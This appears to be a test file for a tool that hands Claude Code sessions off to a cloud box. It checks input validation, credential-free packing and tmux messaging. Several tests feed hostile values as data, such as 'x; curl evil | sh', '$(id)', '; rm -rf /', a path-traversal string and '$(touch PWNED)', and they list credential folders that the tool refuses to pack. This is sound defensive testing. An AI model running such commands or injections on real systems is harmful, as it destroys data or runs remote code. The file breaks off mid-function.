import { describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawn } from "node:child_process";
import { realpathSync } from "node:fs";
import { createServer } from "node:net";
import { afterAll, beforeAll } from "bun:test";
import { b64url, generateEphemeralKeyPair } from "../core/crypto";
import { buildPairURL } from "../core/pair-url";
import {
  BOX_MACHINE_NAME, bakeScript, checkLaunchIds, PAIR_FN, PAIR_POLL, packRefusal, SHM_SWEEP, targetWorker, userLayerFiles, boxPairPayload, createBody, lastModel, latestSession, paneScript, projectDirName,
  pubRawFromPkcs8, q, RELAY_PORT, resultPage, takePairUrl, toOpenRouterModel, withReload,
} from "./handoff";
import { RELAY_PORT as RELAY_LISTEN_PORT } from "./or-relay";
import { readCapped, sameWindowBackLine } from "./handoff";
import { FIRST_SKIPPED, FIRST_UNCONFIRMED, firstMessageScript, sendFirstMessage, sendResult, TYPE_FN } from "./handoff";
import { BACK_FILES, backPackScript, backStopScript, backWaitScript, sessionGuard, resumeCommand } from "./handoff";
import { boxIdle } from "../core/cloud-back";
import { packList } from "./handoff";
import {
  build, id12, updateCloudAt, admitScript, ANY_SESSION, BOX_MAX_SESSIONS, backPrefix, boxPrelude, busyMessage, hereSession, keepaliveLoop, launchLine, normalizeCloud,
  pickSession, shmEnvFile, statusScript, stopOne, tmuxName, writeMarker,
} from "./handoff";

describe("handoff pure logic", () => {
  test("cwd → Claude Code project dir name (every non-alphanumeric → -)", () => {
    expect(projectDirName("/Users/me/my-app")).toBe("-Users-me-my-app");
    expect(projectDirName("/Users/me/app/.claude/worktrees/x")).toBe("-Users-me-app--claude-worktrees-x");
    expect(projectDirName("/a/custom_nodes/b.c")).toBe("-a-custom-nodes-b-c");
  });

  test("model id → OpenRouter id", () => {
    expect(toOpenRouterModel("claude-opus-5-5")).toBe("anthropic/claude-opus-5.5");
    expect(toOpenRouterModel("claude-haiku-5-5")).toBe("anthropic/claude-haiku-5.5");
    expect(toOpenRouterModel("claude-sonnet-4-5-20250929")).toBe("anthropic/claude-sonnet-4.5");
    expect(toOpenRouterModel("claude-opus-5-5[1m]")).toBe("anthropic/claude-opus-5.5");
    expect(toOpenRouterModel("anthropic/claude-haiku-5.5")).toBe("anthropic/claude-haiku-5.5");
  });

  test("last real model wins; synthetic rows and torn lines are skipped", () => {
    const jsonl = [
      JSON.stringify({ type: "assistant", message: { model: "claude-haiku-5-5" } }),
      JSON.stringify({ type: "assistant", message: { model: "claude-opus-5-5" } }),
      JSON.stringify({ type: "assistant", message: { model: "<synthetic>" } }),
      '{"type":"assistant","mess',
    ].join("\n");
    expect(lastModel(jsonl)).toBe("claude-opus-5-5");
    expect(lastModel("")).toBeUndefined();
  });

  test("a box-touched transcript's OpenRouter id still wins, and maps back for the box", () => {
    const jsonl = [
      JSON.stringify({ type: "assistant", message: { model: "claude-opus-5-5" } }),
      JSON.stringify({ type: "assistant", message: { model: "anthropic/claude-haiku-5.5" } }),
    ].join("\n");
    expect(lastModel(jsonl)).toBe("claude-haiku-5-5");
    expect(toOpenRouterModel(lastModel(jsonl)!)).toBe("anthropic/claude-haiku-5.5");
  });

  test("latest session = newest .jsonl; dirs like memory/ ignored", () => {
    expect(latestSession([
      { name: "a.jsonl", mtimeMs: 1 }, { name: "memory", mtimeMs: 9 }, { name: "b.jsonl", mtimeMs: 5 },
    ])).toBe("b");
    expect(latestSession([{ name: "memory", mtimeMs: 1 }])).toBeUndefined();
  });

  test("shell quoting survives a single quote", () => {
    expect(q("it's")).toBe(`'it'\\''s'`);
  });

  test("pkcs8 private key → the same raw public key pairStart put in the QR", async () => {
    const kp = await generateEphemeralKeyPair();
    expect(b64url(await pubRawFromPkcs8(kp.privPkcs8))).toBe(b64url(kp.pubRaw));
  });

  test("box pair payload: stamps machineName, rebuilds the exact pairing URL", async () => {
    const kp = await generateEphemeralKeyPair();
    const qr = new Uint8Array(16).fill(7);
    const pending = { url: "https://api.nomo.gg", pairingId: "ab".repeat(16), pcSecret: "x", qrSecretB64: b64url(qr), pcEphPrivB64: b64url(kp.privPkcs8), createdAt: 1 };
    const { config, url } = await boxPairPayload(JSON.stringify(pending), BOX_MACHINE_NAME, buildPairURL);
    expect(url).toBe(buildPairURL(pending.url, pending.pairingId, qr, kp.pubRaw));
    expect(JSON.parse(config)).toEqual({ ...pending, machineName: "Nomo Cloud" });
    await expect(boxPairPayload(JSON.stringify({ ...pending, e2eKeyB64: "k" }), "n", buildPairURL)).rejects.toThrow();
    await expect(boxPairPayload("{}", "n", buildPairURL)).rejects.toThrow();
  });

  test("the pairing URL marker is split out of box stdout, never echoed", () => {
    expect(takePairUrl("pane\nNOMO_PAIR_URL=nomo://pair?v=1&p=x\nmore")).toEqual({ url: "nomo://pair?v=1&p=x", rest: "pane\nmore" });
    expect(takePairUrl("just pane")).toEqual({ url: undefined, rest: "just pane" });
  });

  test("claude's base URL is the port the relay listens on", () => {
    expect(RELAY_PORT).toBe(RELAY_LISTEN_PORT);
  });

  test("create body: baked template XOR the omg preset, same size, per-Mac external id", () => {
    expect(createBody(true, "m")).toEqual({ templateId: "nomo-base", size: "pro", externalUserId: "m" });
    expect(createBody(false, "m")).toEqual({ template: "omg", size: "pro", externalUserId: "m" });
  });

  test("the bake script carries no credentials or session state, and scrubs before the snapshot", () => {
    const s = bakeScript('{"name":"nomo"}');
    expect(s).not.toMatch(/ANTHROPIC|OPENROUTER|AUTH_TOKEN|API_KEY|credentials/);
    expect(s).toContain("claude plugin install nomo-cc@nomo");
    expect(s).toMatch(/rm -rf .*\/root\/\.config\/cc-status .*\/root\/\.claude\/projects/);
  });

  test("user text reaches tmux only through env, never the script", () => {
    const U = "0b5c3d1e-2f4a-4b6c-8d9e-0f1a2b3c4d5e";
    expect(paneScript("send", U)).toContain(TYPE_FN);
    expect(paneScript("send", U)).not.toContain("send-keys -t \"=$T:\" -l");
    expect(paneScript("key", U)).toContain(`send-keys -t "=$T:" -- "$NOMO_KEY"`);
    expect(paneScript("screen", U)).toContain(`capture-pane -p -t "=$T:"`);
    expect(paneScript("screen", U)).toContain(`nomo_t '${U}'`);
  });

  test("the pending pair page reloads itself; the result page carries no QR", () => {
    expect(withReload("<html><head><title>x</title>")).toContain(`<head>\n<meta http-equiv="refresh" content="3">`);
    const done = resultPage("Paired ✓", "close");
    expect(done).toContain("Paired ✓");
    expect(done).not.toMatch(/<svg|refresh|nomo:\/\//);
  });

  test("target worker: --worker, then the Mac's env, then production; origins only", () => {
    expect(targetWorker("https://stg.example.dev/", "https://env.example")).toBe("https://stg.example.dev");
    expect(targetWorker(undefined, "https://env.example")).toBe("https://env.example");
    expect(targetWorker(true, undefined)).toBe("https://api.nomo.gg");
    expect(() => targetWorker("api.nomo.gg; rm -rf /", undefined)).toThrow();
  });

  test("target worker: https only, http just for loopback, never userinfo or a path", () => {
    expect(targetWorker("http://localhost:8787", undefined)).toBe("http://localhost:8787");
    expect(targetWorker("http://127.0.0.1:8787", undefined)).toBe("http://127.0.0.1:8787");
    expect(targetWorker("http://[::1]:8787", undefined)).toBe("http://[::1]:8787");
    expect(() => targetWorker("http://staging.example.workers.dev", undefined)).toThrow(/https/);
    expect(() => targetWorker("https://user:pw@staging.example.workers.dev", undefined)).toThrow();
    expect(() => targetWorker("https://api.nomo.gg@evil.example", undefined)).toThrow();
    expect(() => targetWorker("https://staging.example.workers.dev/path", undefined)).toThrow();
    expect(() => targetWorker("ftp://staging.example.workers.dev", undefined)).toThrow();
  });

  test("a folder is never packed whole when it is, or holds, home or a credential store", () => {
    const none = () => false;
    expect(packRefusal("/home/me", "/home/me", none)).toMatch(/home folder/);
    expect(packRefusal("/home", "/home/me", none)).toMatch(/home folder/);
    expect(packRefusal("/", "/home/me", none)).toMatch(/home folder/);
    expect(packRefusal("/home/me/app", "/home/me", none)).toBeUndefined();
    expect(packRefusal("/srv/app", "/home/me", none)).toBeUndefined();
    expect(packRefusal("/home/me/..odd", "/home/me", none)).toBeUndefined();
    for (const p of [".claude", ".config/cc-status", ".ssh", ".gnupg", ".aws", "Library/Keychains"]) {
      expect(packRefusal("/home/me/app", "/home/me", (x) => x === `/home/me/app/${p}`)).toBe(`/home/me/app contains ${p}`);
    }
  });

  test("session id must be a UUID and the model a plain id before either reaches the launch line", () => {
    const u = "0b5c3d1e-2f4a-4b6c-8d9e-0f1a2b3c4d5e";
    expect(() => checkLaunchIds(u, "anthropic/claude-opus-5.5")).not.toThrow();
    expect(() => checkLaunchIds(u, "anthropic/claude-opus-5.5[1m]")).not.toThrow();
    expect(() => checkLaunchIds(u, "x; curl evil | sh")).toThrow(/model id/);
    expect(() => checkLaunchIds(u, "$(id)")).toThrow(/model id/);
    expect(() => checkLaunchIds(u, "")).toThrow(/model id/);
    expect(() => checkLaunchIds("../../etc/passwd", "m")).toThrow(/UUID/);
    expect(() => checkLaunchIds(`${u}; rm -rf /`, "m")).toThrow(/UUID/);
  });

  test("user layer: links inside their folder are followed, links outside it are skipped", () => {
    const d = mkdtempSync(join(tmpdir(), "nomo-layer-"));
    const home = join(d, ".claude"), outside = join(d, "outside");
    mkdirSync(join(home, "skills", "real"), { recursive: true });
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(home, "skills", "real", "SKILL.md"), "x");
    writeFileSync(join(outside, "secret"), "s");
    writeFileSync(join(home, ".credentials.json"), "{}");
    writeFileSync(join(outside, "CLAUDE.md"), "# mine");
    symlinkSync(join(home, "skills", "real"), join(home, "skills", "alias"));      // inside → followed
    symlinkSync(outside, join(home, "skills", "escape"));                         // outside → skipped
    symlinkSync(join(home, ".credentials.json"), join(home, "skills", "creds"));  // ~/.claude but not skills → skipped
    symlinkSync(join(home, "skills"), join(home, "skills", "real", "loop"));      // a loop → not walked forever
    symlinkSync(join(outside, "CLAUDE.md"), join(home, "CLAUDE.md"));             // top-level file link → followed
    const { files, skipped } = userLayerFiles(home, ["skills", "CLAUDE.md"]);
    expect(files.sort()).toEqual(["CLAUDE.md", "skills/alias/SKILL.md", "skills/real/SKILL.md"]);
    expect(skipped.sort()).toEqual(["skills/creds", "skills/escape"]);
  });

  test("every non-handoff box script first drops a stale /dev/shm/nomo-env", () => {
    const U = "0b5c3d1e-2f4a-4b6c-8d9e-0f1a2b3c4d5e";
    for (const s of [paneScript("send", U), paneScript("key", U), paneScript("screen", U), PAIR_POLL]) expect(s.startsWith(SHM_SWEEP)).toBe(true);
    expect(SHM_SWEEP).toContain("-name 'nomo-env*'"); // the per-session files too
    expect(SHM_SWEEP).toContain("-mmin +1"); // never one a handoff in flight just wrote
  });

  // nomo_pair run for real in bash, with the box paths pointed at a temp dir and bun/tmux stubbed.
  function runPair(config: object | null, worker?: string): string {
    const d = mkdtempSync(join(tmpdir(), "nomo-pairfn-"));
    const cc = join(d, "cc"), plug = join(d, "cache", "nomo", "nomo-cc", "2.3.8"), bin = join(d, "bin");
    for (const x of [cc, join(plug, "dist"), bin]) mkdirSync(x, { recursive: true });
    if (config) writeFileSync(join(cc, "config.json"), JSON.stringify(config));
    writeFileSync(join(bin, "bun"), `#!/bin/sh\necho "bun $* W=$NOMO_WORKER_URL" >> ${d}/calls\n`);
    writeFileSync(join(bin, "tmux"), "#!/bin/sh\nexit 0\n");
    chmodSync(join(bin, "bun"), 0o755); chmodSync(join(bin, "tmux"), 0o755);
    const fn = PAIR_FN.replaceAll("/root/.config/cc-status", cc).replaceAll("/root/.claude/plugins/cache", join(d, "cache"));
    const out = execFileSync("bash", ["-c", `${fn}\nnomo_pair; cat ${d}/calls 2>/dev/null || true`], {
      env: { PATH: `${bin}:/usr/bin:/bin`, ...(worker ? { NOMO_WORKER_URL: worker } : {}) },
    }).toString();
    return out;
  }

  test("box pairing: same worker → kept; different worker → re-paired to the target", () => {
    const stg = "https://staging.example.workers.dev";
    expect(runPair({ url: "https://api.nomo.gg", e2eKeyB64: "k" })).toBe("NOMO_PAIRED\n");
    expect(runPair({ url: stg, e2eKeyB64: "k" }, stg)).toBe("NOMO_PAIRED\n");
    const re = runPair({ url: "https://api.nomo.gg", e2eKeyB64: "k" }, stg);
    expect(re).toContain("NOMO_REPAIR: https://api.nomo.gg");
    expect(re).toContain(`dist/pair.mjs W=${stg}`);
    expect(runPair(null)).toContain("dist/pair.mjs W=https://api.nomo.gg");
  });
});

describe("bring back (--back)", () => {
  const U = "11111111-2222-3333-4444-555555555555";
  const scripts = [backPackScript(U, "-tmp-proj", "/tmp/proj", true), backPackScript(U, "-tmp-proj", "/tmp/proj", false)];

  test("the pack never reaches .claude.json, /dev/shm or cc-status (beyond the sweep and the excludes)", () => {
    for (const s of scripts) {
      expect(s.startsWith(SHM_SWEEP)).toBe(true);
      const body = s.slice(SHM_SWEEP.length).replace(/--exclude '[^']*'/g, "");
      for (const bad of [".claude.json", "/dev/shm", "cc-status", ".credentials"]) expect(body).not.toContain(bad);
      expect(s).toContain("--exclude '.config/cc-status'");
    }
    expect([...BACK_FILES]).toEqual(["repo.bundle", "wip.patch", "untracked.tgz", "project.tgz", "folder.tgz"]);
  });

  test("every box script is valid bash", () => {
    for (const s of [...scripts, backStopScript(U), backWaitScript(U, "-tmp-proj")]) execFileSync("bash", ["-n", "-c", s]);
  });

  test("--back --session X never stops a different session (unless --force)", () => {
    // Checked first, whether or not tmux still runs: a brought-back A must not pack a later B at the same root.
    for (const s of [backStopScript(U), backWaitScript(U, "-tmp-proj"), ...scripts]) {
      expect(s.startsWith(boxPrelude(U))).toBe(true);
      expect(s.slice(boxPrelude(U).length).trimStart().startsWith(sessionGuard(U))).toBe(true);
    }
    expect(backStopScript(U)).not.toContain(`rm -f "$SD/"`); // the marker stays: the pack checks it too
  });

  test("boxIdle: Nomo's record wins; needsAttention asks the user; sessionStart asks the transcript", () => {
    const end = JSON.stringify({ type: "assistant", message: { stop_reason: "end_turn" } });
    const tool = JSON.stringify({ type: "assistant", message: { stop_reason: "tool_use" } });
    expect(boxIdle({ lastEvent: "done", tail: "", quietS: 0 })).toBe("idle");
    // A compact's SessionStart fires mid-turn: not idle on its own.
    expect(boxIdle({ lastEvent: "sessionStart", tail: "", quietS: 99 })).toBe("busy");
    expect(boxIdle({ lastEvent: "sessionStart", tail: tool, quietS: 99 })).toBe("busy");
    expect(boxIdle({ lastEvent: "sessionStart", tail: end, quietS: 5 })).toBe("busy");
    expect(boxIdle({ lastEvent: "sessionStart", tail: end, quietS: 20 })).toBe("idle");
    expect(boxIdle({ lastEvent: "needsAttention", tail: "", quietS: 99 })).toBe("attention");
    expect(boxIdle({ lastEvent: "working", tail: "", quietS: 99 })).toBe("busy");
  });

  test("boxIdle without a record: end_turn + meta only + 15s quiet; a torn tail is fine", () => {
    const end = JSON.stringify({ type: "assistant", message: { stop_reason: "end_turn" } });
    const tool = JSON.stringify({ type: "assistant", message: { stop_reason: "tool_use" } });
    const meta = JSON.stringify({ type: "system", subtype: "stop_hook_summary" });
    const user = JSON.stringify({ type: "user", message: { content: "next" } });
    const torn = 'ant","message":{"stop_reason":"tool_use"}}';
    expect(boxIdle({ tail: [torn, end, meta, ""].join("\n"), quietS: 20 })).toBe("idle");
    expect(boxIdle({ tail: [torn, end].join("\n"), quietS: 5 })).toBe("busy");
    expect(boxIdle({ tail: [end, user].join("\n"), quietS: 60 })).toBe("busy");
    expect(boxIdle({ tail: [end, tool].join("\n"), quietS: 60 })).toBe("busy");
    expect(boxIdle({ tail: [end, '{"type":"assis'].join("\n"), quietS: 60 })).toBe("idle");
    expect(boxIdle({ tail: torn, quietS: 60 })).toBe("busy");
  });

  test("the resume line is one quoted exec", () => {
    expect(resumeCommand("/tmp/it's here", U)).toBe(`cd '/tmp/it'\\''s here' && exec claude --resume ${U}`);
  });

  test("--back resumes on the box's model as a bare CC id (an OpenRouter id can't be restored on the Mac)", () => {
    const jsonl = JSON.stringify({ type: "assistant", message: { model: "anthropic/claude-haiku-5.5" } });
    expect(resumeCommand("/w", U, lastModel(jsonl))).toBe(`cd '/w' && exec claude --resume ${U} --model 'claude-haiku-5-5'`);
    for (const bad of [undefined, "", "gpt-5", "claude-x; rm -rf /", "anthropic/claude-haiku-5.5"]) {
      expect(resumeCommand("/w", U, bad)).toBe(`cd '/w' && exec claude --resume ${U}`);
    }
  });
});

describe("readCapped (a /files download never exceeds its cap)", () => {
  const stream = (chunks: number, size: number) => new ReadableStream<Uint8Array>({
    start(c) { for (let i = 0; i < chunks; i++) c.enqueue(new Uint8Array(size).fill(97)); c.close(); },
  });

  test("a Content-Length over the cap is refused before the body is read", async () => {
    let pulled = 0;
    const body = new ReadableStream<Uint8Array>({ pull(c) { pulled++; c.enqueue(new Uint8Array(10)); } });
    const res = new Response(body, { headers: { "content-length": "5000" } });
    await expect(readCapped(res, 1000)).rejects.toThrow("refusing");
    expect(pulled).toBeLessThanOrEqual(1); // at most the stream's initial pull
  });

  test("no Content-Length: counted while streaming, aborted past the cap", async () => {
    const fakeFetch = async () => new Response(stream(100, 1000)); // 100 KB, no length header
    const res = await fakeFetch();
    expect(res.headers.get("content-length")).toBeNull();
    await expect(readCapped(res, 10_000)).rejects.toThrow("refusing");
  });

  test("under the cap: the whole body, multi-byte text intact", async () => {
    expect(await readCapped(new Response(stream(3, 1000)), 10_000)).toHaveLength(3000);
    expect(await readCapped(new Response(JSON.stringify({ content: "héllo ✓" })), 1000)).toBe('{"content":"héllo ✓"}');
    expect(await readCapped(new Response("x".repeat(50)))).toHaveLength(50); // no cap
  });
});

describe("first message (--then, /nomo-cc:handoff)", () => {
  const NASTY = `it's "$HOME" \`id\` $(touch PWNED) \\n ; rm -rf x\nsecond line`;
  const READY = "> earlier prompt\n⏺ done.\n\n────────────────\n> \n────────────────\n  ? for shortcuts\n";
  const MENU = "────────────────\n Resume this session?\n❯ 1. Yes\n  2. No\n";
  // What CC 2.1.303 really draws: "❯" + NBSP (captured live from a box pane), for the prompt and menus alike.
  const READY_NBSP = "● done.\n────────────────\n❯\u00a0\n────────────────\n  ⏵⏵ auto mode on (shift+tab to cycle)\n";
  const MENU_NBSP = "────────────────\n Resume this session?\n❯\u00a01. Yes\n  2. No\n";
  /** The idle screen after CC accepted `text`: its first line shows in the history above the empty input. */
  const submitted = (text: string) => `❯\u00a0${text.split("\n")[0]}\n${READY_NBSP}`;

  /** Run firstMessageScript against a fake tmux showing `screen` (`after[n]` once n Enters went in);
   *  returns stdout, the pasted text, the keys. */
  function runBox(screen: string, { tries = 3, text = NASTY, after = [] as string[], locale = "C" } = {}): { out: string; typed?: string; keys: string } {
    const d = mkdtempSync(join(tmpdir(), "nomo-then-")), bin = join(d, "bin");
    mkdirSync(bin);
    writeFileSync(join(d, "screen"), screen);
    after.forEach((a, i) => writeFileSync(join(d, `screen.${i + 1}`), a));
    writeFileSync(join(bin, "tmux"), `#!/bin/bash
case "$1" in
  has-session) exit 0 ;;
  capture-pane) n=$(cat ${d}/keys 2>/dev/null | grep -c Enter); [ -f ${d}/screen.$n ] && cat ${d}/screen.$n || cat ${d}/screen ;;
  load-buffer) cat > ${d}/buf ;;
  paste-buffer) mv ${d}/buf ${d}/typed; echo paste >> ${d}/keys ;;
  send-keys) echo "$4" >> ${d}/keys ;;
esac
`);
    writeFileSync(join(bin, "sleep"), "#!/bin/sh\nexit 0\n");
    chmodSync(join(bin, "tmux"), 0o755); chmodSync(join(bin, "sleep"), 0o755);
    const out = execFileSync("bash", ["-c", firstMessageScript("0b5c3d1e-2f4a-4b6c-8d9e-0f1a2b3c4d5e", tries)], { cwd: d, env: { PATH: `${bin}:/usr/bin:/bin`, NOMO_TEXT: text, LC_ALL: locale } }).toString();
    const read = (f: string) => (existsSync(join(d, f)) ? readFileSync(join(d, f), "utf8") : undefined);
    return { out, typed: read("typed"), keys: read("keys") ?? "", };
  }

  test("idle at the input box → the text arrives literally (quotes, $, backticks, newlines), then Enter", () => {
    const r = runBox(READY, { after: [submitted(NASTY)] });
    expect(r.out.trim()).toBe("NOMO_SENT");
    expect(r.typed).toBe(NASTY);
    expect(r.keys).toBe("paste\nEnter\n");
    expect(firstMessageScript("0b5c3d1e-2f4a-4b6c-8d9e-0f1a2b3c4d5e")).not.toContain("it's");
  });

  for (const locale of ["C", "C.UTF-8"]) {
    test(`readiness under LC_ALL=${locale}: the real prompt (❯ + NBSP) is ready, real menus never typed into`, () => {
      expect(runBox(READY_NBSP, { locale, after: [submitted(NASTY)] }).out.trim()).toBe("NOMO_SENT");
      for (const screen of [MENU, MENU_NBSP, "", "Resuming conversation…\n"]) {
        const r = runBox(screen, { locale });
        expect(r.out.trim()).toBe("NOMO_NOT_READY");
        expect(r.typed).toBeUndefined();
      }
    });

    test(`numbered text that is not a menu no longer blocks readiness (LC_ALL=${locale})`, () => {
      for (const hist of ["⏺ arrow => 2. next", "⏺ when x > 3.5 it fails", "❯\u00a02. fix the parser"]) {
        expect(runBox(READY_NBSP.replace("● done.", hist), { locale, after: [submitted(NASTY)] }).out.trim()).toBe("NOMO_SENT");
      }
    });
  }

  test("a trailing ; or \\; reaches tmux intact (no send-keys command separator)", () => {
    for (const text of ["run tests;", "a\\;", "x ; y;"]) expect(runBox(READY, { text }).typed).toBe(text);
  });

  test("Enter swallowed into the paste → one more Enter; still there → NOMO_UNCONFIRMED, never NOMO_SENT", () => {
    const stuck = "────────────────\n❯\u00a0it's still here\n────────────────\n";
    const r = runBox(READY_NBSP, { after: [stuck, submitted(NASTY)] });
    expect(r.out.trim()).toBe("NOMO_SENT");
    expect(r.keys).toBe("paste\nEnter\nEnter\n");
    const s = runBox(READY_NBSP, { after: [stuck, stuck] });
    expect(s.out.trim()).toBe("NOMO_UNCONFIRMED");
    expect(s.keys).toBe("paste\nEnter\nEnter\n");
  });

  test("busy (CC still working on the last message) → nothing pasted, NOMO_BUSY, reported as not sent", () => {
    // --send runs TYPE_FN alone; a live spinner changes the screen every capture, so it never goes idle
    const d = mkdtempSync(join(tmpdir(), "nomo-busy-")), bin = join(d, "bin");
    mkdirSync(bin);
    writeFileSync(join(bin, "tmux"), `#!/bin/bash
case "$1" in
  has-session) exit 0 ;;
  capture-pane) echo "✻ Thinking $RANDOM"; printf '────\\n❯ \\n────\\n' ;;
  *) echo "$1" >> ${d}/keys ;;
esac
`);
    writeFileSync(join(bin, "sleep"), "#!/bin/sh\nexit 0\n");
    chmodSync(join(bin, "tmux"), 0o755); chmodSync(join(bin, "sleep"), 0o755);
    let out = "", code = 0;
    try { out = execFileSync("bash", ["-c", `${TYPE_FN}\nnomo_type`], { cwd: d, env: { PATH: `${bin}:/usr/bin:/bin`, NOMO_TEXT: "hi" } }).toString(); }
    catch (e) { const x = e as { stdout: Buffer; status: number }; out = x.stdout.toString(); code = x.status; }
    expect(out.trim()).toBe("NOMO_BUSY");
    expect(code).toBe(1);
    expect(existsSync(join(d, "keys"))).toBe(false); // no load-buffer, paste or Enter
    expect(sendResult("NOMO_BUSY\n")).toMatch(/^Not sent/);
    expect(sendResult("NOMO_UNCONFIRMED\n")).toMatch(/^Not confirmed.*--screen/);
    expect(sendResult("NOMO_SENT\n")).toBe("Sent.");
  });

  test("paste dropped (input empty but the text never reached the history) → NOMO_UNCONFIRMED, never sent", () => {
    const r = runBox(READY_NBSP, { text: "/model x" , after: [READY_NBSP, READY_NBSP, READY_NBSP] });
    expect(r.out.trim()).toBe("NOMO_UNCONFIRMED");
    // the bug's second message, sent idle and accepted: multi-line, trailing ; and a cut mid-UTF-8 char
    const two = "日本語のテキストはここで四十バイトを超えます、本当に\nsecond line;";
    expect(runBox(READY_NBSP, { text: two, after: [submitted(two)], locale: "C.UTF-8" }).out.trim()).toBe("NOMO_SENT");
    expect(runBox(READY_NBSP, { text: two, after: [submitted(two)] }).out.trim()).toBe("NOMO_SENT");
  });

  test("not ready / box error → a skip line, never a throw (the handoff already succeeded)", async () => {
    const U1 = "0b5c3d1e-2f4a-4b6c-8d9e-0f1a2b3c4d5e";
    let env: Record<string, string> = {};
    expect(await sendFirstMessage(async (_s, e) => { env = e; return { stdout: "NOMO_SENT\n" }; }, NASTY, U1)).toContain("sent");
    expect(env).toEqual({ NOMO_TEXT: NASTY });
    expect(await sendFirstMessage(async () => ({ stdout: "NOMO_NOT_READY\n" }), "x", U1)).toBe(FIRST_SKIPPED);
    expect(FIRST_SKIPPED).toContain("--screen");
    expect(await sendFirstMessage(async () => ({ stdout: "NOMO_UNCONFIRMED\n" }), "x", U1)).toBe(FIRST_UNCONFIRMED);
    expect(await sendFirstMessage(async () => { throw new Error("502"); }, "x", U1)).toBe(FIRST_SKIPPED);
  });

  test("the command passes its argument only as a quoted-heredoc body: never argv, never expanded", () => {
    const md = readFileSync(join(import.meta.dir, "../../plugin/commands/handoff.md"), "utf8");
    const blocks = [...md.matchAll(/```\n([\s\S]*?)```/g)].map((m) => m[1]);
    for (const b of blocks) expect(b).not.toContain("$ARGUMENTS");
    const arm = blocks.find((b) => b.includes("--args-stdin"))!;
    const d = mkdtempSync(join(tmpdir(), "nomo-cmd-"));
    mkdirSync(join(d, "scripts"));
    writeFileSync(join(d, "scripts", "run.sh"), `#!/bin/sh\nprintf '%s\\n' "$@" > ${d}/argv\ncat > ${d}/stdin\n`);
    chmodSync(join(d, "scripts", "run.sh"), 0o755);
    const arg = `then ${NASTY}`;
    const filled = arm.replaceAll("XXXXXXXXXXXX", "q7Zp2Kx9Lm4T").replace("\nARGUMENT\n", `\n${arg}\n`);
    execFileSync("bash", ["-c", filled], { cwd: d, env: { PATH: "/usr/bin:/bin", HOME: d, CLAUDE_PLUGIN_ROOT: d, CLAUDE_SESSION_ID: "0a1b2c3d-1111-4222-8333-444455556666" } });
    expect(readFileSync(join(d, "stdin"), "utf8")).toBe(`${arg}\n`);
    const argv = readFileSync(join(d, "argv"), "utf8");
    expect(argv).toContain("--args-stdin");
    expect(argv).not.toContain("touch");
    expect(existsSync(join(d, "PWNED"))).toBe(false);
  });
});

test("/nomo-cc:back from the parked window ends with the /resume line", () => {
  expect(sameWindowBackLine("0a1b2c3d-1111-4222-8333-444455556666")).toBe("Back. Type /resume 0a1b2c3d-1111-4222-8333-444455556666 to continue here.");
});

describe("packList (secrets never leave the Mac in the user-file tars)", () => {
  const tarOf = (root: string, list: Buffer): string[] => {
    const out = join(mkdtempSync(join(tmpdir(), "nomo-pack-")), "t.tgz");
    execFileSync("tar", ["-czf", out, "--no-recursion", "--null", "-T", "-"], { cwd: root, input: list });
    return execFileSync("tar", ["-tzf", out]).toString().split("\n").filter(Boolean).map((p) => p.replace(/\/$/, "")).sort();
  };
  test("git: an un-ignored .env is not in the untracked tar", () => {
    const r = mkdtempSync(join(tmpdir(), "nomo-pack-"));
    execFileSync("git", ["init", "-q"], { cwd: r });
    mkdirSync(join(r, "src"));
    for (const f of [".env", "src/new.ts", "src/key.pem", ".env.example"]) writeFileSync(join(r, f), "x");
    const ut = execFileSync("git", ["ls-files", "--others", "--exclude-standard", "-z"], { cwd: r }).toString().split("\0").filter(Boolean);
    expect(ut).toContain(".env");
    expect(tarOf(r, packList(r, ut))).toEqual([".env.example", "src/new.ts"]);
  });
  test("non-git: .env anywhere, node_modules and .git are not in the folder tar; links are not followed", () => {
    const d = mkdtempSync(join(tmpdir(), "nomo-pack-"));
    for (const p of ["a/b", "node_modules/x", "a/node_modules", ".git", "empty"]) mkdirSync(join(d, p), { recursive: true });
    for (const f of [".env", "a/b/.env.local", "a/b/c.txt", "node_modules/x/i.js", "a/node_modules/j.js", ".git/HEAD", "main.py"]) writeFileSync(join(d, f), "x");
    symlinkSync(d, join(d, "a", "loop"));
    const skip = (n: string) => n === "node_modules" || n === ".git";
    expect(tarOf(d, packList(d, ["a", "empty", "main.py", ".env"], skip))).toEqual(["a", "a/b", "a/b/c.txt", "a/loop", "empty", "main.py"]);
  });
});

describe("several sessions on one box (NOM-92)", () => {
  const A = "aaaaaaaa-1111-4222-8333-444455556666", B = "bbbbbbbb-1111-4222-8333-444455556666";
  const C = "cccccccc-1111-4222-8333-444455556666", D = "dddddddd-1111-4222-8333-444455556666";
  const E = "eeeeeeee-1111-4222-8333-444455556666", L = "11111111-1111-4222-8333-444455556666";

  // The handoff script's relay check dials 127.0.0.1:RELAY_PORT: something must answer (or already does).
  const relay = createServer((c) => c.end());
  beforeAll(() => new Promise<void>((r) => { relay.once("error", () => r()); relay.listen(RELAY_PORT, "127.0.0.1", () => r()); }));
  afterAll(() => { relay.close(); });

  /** A project folder (a git repo with one commit), by name. */
  const projects = new Map<string, string>();
  function proj(name: string): string {
    if (!projects.has(name)) {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), `nomo-proj-${name}-`)));
      execFileSync("git", ["init", "-q"], { cwd: dir });
      execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "i"], { cwd: dir });
      projects.set(name, dir);
    }
    return projects.get(name)!;
  }
  /** The REAL handoff box script build() makes for session `u` in project `name` (fake HOME + transcript). */
  const scripts = new Map<string, string>();
  function realScript(u: string, name: string): string {
    const key = `${u} ${name}`;
    if (!scripts.has(key)) {
      const root = proj(name), home = mkdtempSync(join(tmpdir(), "nomo-home-")), out = mkdtempSync(join(tmpdir(), "nomo-out-"));
      const pd = join(home, ".claude", "projects", projectDirName(root));
      mkdirSync(pd, { recursive: true });
      writeFileSync(join(pd, `${u}.jsonl`), JSON.stringify({ type: "assistant", message: { model: "claude-opus-5-5" } }) + "\n");
      const prev = { home: process.env.HOME, cwd: process.cwd() };
      process.env.HOME = home; process.chdir(root);
      try { scripts.set(key, build(new Map([["--session", u]]), out).script); } finally { process.env.HOME = prev.home; process.chdir(prev.cwd); }
    }
